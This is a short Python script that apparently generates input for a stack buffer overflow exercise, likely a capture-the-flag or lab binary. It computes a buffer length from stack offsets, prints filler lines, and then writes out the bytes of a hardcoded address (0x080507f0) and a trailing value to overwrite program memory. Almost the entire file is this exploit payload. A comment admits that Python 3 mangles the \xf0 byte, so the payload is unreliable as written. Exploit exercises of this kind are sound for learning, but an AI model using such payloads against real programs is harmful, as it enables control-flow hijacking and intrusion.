#! /usr/bin/python

print("__________")

#            &i   - &buffer
len_buffer = 0x28 - 0x1c

for i in range(24):
	print("A" + "B" * (len_buffer - 1))

# Python 3 for some reason changes \xf0 to \x??c3 something with encoding???
# 0x080507f0
print("\xf0" + "B" * (len_buffer - 1))
print("\x07" + "B" * (len_buffer - 1))
print("\x05" + "B" * (len_buffer - 1))
print("\x08" + "B" * (len_buffer - 1) + chr(9) + chr(0) + chr(0) + chr(0))  


